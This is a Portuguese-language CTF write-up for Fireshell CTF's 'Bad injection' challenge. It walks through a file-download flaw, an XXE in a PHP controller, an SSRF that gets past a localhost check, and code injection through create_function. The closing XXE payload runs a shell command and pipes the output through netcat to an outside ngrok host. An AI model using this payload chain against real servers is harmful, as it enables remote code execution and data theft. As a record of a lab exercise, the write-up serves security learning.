# Bad injection [ [Fireshell CTF] ](https://ctftime.org/event/727)

## Levantamento de informações 

![index](https://i.imgur.com/vtZ1BiQ.png)

Acessando as 3 primeiras abas disponíveis **home**, **about** e **contact**, nada de útil nos é apresentado. Mas, acessando a aba **List**, a página nos retorna o icone de uma "imagem
corrompida" ao lado da imagem carregada.

Analisando a source desta página, é possível ver uma passagem de parâmetros:

```
download?file=files/test.txt&hash=293d05cb2ced82858519bdec71a0354b

```

eis a "imagem corrompida". Com estes parâmetros, podemos ler qualquer arquivo dentro do server. Os requisitos são:
* o path do arquivo estar exato
* o parâmetro **hash** deve conter o md5 do arquivo buscado.

![listagem-diretorios](https://i.imgur.com/kVAupWz.png)


## Exploração

Varrendo o server, é possível encontrar o arquivo **Routes.php** dentro do diretório **/app/** onde é necessária alguma entrada de solicitação http.

    ...
    ...
    ...
    
    Route::set('custom',function(){
      $handler = fopen('php://input','r');
      $data = stream_get_contents($handler);
      if(strlen($data) > 1){
        Custom::Test($data);
      }else{
        Custom::createView('Custom');
      }
    });
    ...
    ...
    ...

E o arquivo **Custom.php** em **/app/Controllers/** .

    <br />
    <b>Notice</b>:  Undefined variable: type in <b>/app/Controllers/Download.php</b> on line <b>21</b><br />
    <?php
    
    class Custom extends Controller{
      public static function Test($string){
          $root = simplexml_load_string($string,'SimpleXMLElement',LIBXML_NOENT);
          $test = $root->name;
          echo $test;
      }
    
    }
    
     ?>


Utilizando do XXE, também podemos retornar arquivos do servidor.

![xxe](https://i.imgur.com/5aKPJVP.png)

## Localhost bypass

no arquivo **Routes.php** citado acima, também é possível ver o seguinte trecho de código:

```
Route::set('admin',function(){
  if(!isset($_REQUEST['rss']) && !isset($_REQUES['order'])){
    Admin::createView('Admin');
  }else{
    if($_SERVER['REMOTE_ADDR'] == '127.0.0.1' || $_SERVER['REMOTE_ADDR'] == '::1'){
      Admin::sort($_REQUEST['rss'],$_REQUEST['order']);
    }else{
     echo ";(";
    }
  }
})
```

Esse trecho verifica se a solicitação vem do localhost dentro de uma estrutura condicional. Caso venha, realizada a chamda em Admin::sort.

Observando o arquivo **Admin.php** (também baixado fuçando o server), vemos que Admin::sort contém:

    usort($data, create_function('$a, $b', 'return strcmp($a->'.$order.',$b->'.$order.');'));


que nos dá uma clara injeção de código.

---
Desta forma, precisamos utilizar do XXE fazer o bypass da verificação do localhost e logo depois fazer uma request para /Admin, que nos retorna a execução remota de código.

o árduo payload:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "http://127.0.0.1/admin?rss=http://SEU_IP/file.xml&order=link.file_get_contents('http://SEU_IP/'.exec('cat'.chr(32).'/da0f72d5d79169971b62a479c34198e7'.chr(124).'/bin/nc'.chr(32).'0.tcp.ngrok.io'.chr(32).'12776'))">
    ]>
    <root><name>&xxe;</name></root>

* o arquivo **file.xml** deve ser upado no seu servidor, com um rss válido com a route e adminsort para a request.

a saída:

![flag](https://i.imgur.com/FyBD4eq.png)

**Flag : f#{1_d0nt_kn0w_wh4t_i4m_d01ng}**

## Considerações finais

Não conseguimos matar a flag no decorrer do campeonato, mas depois de apanhar mais que saco que pancadas, a flag surgiu e com ela o aprendizado. Parabéns à equipe Fireshell por proporcionar um ótimo campeonato.


*[RSS W3schools](https://www.w3schools.com/xml/xml_rss.asp)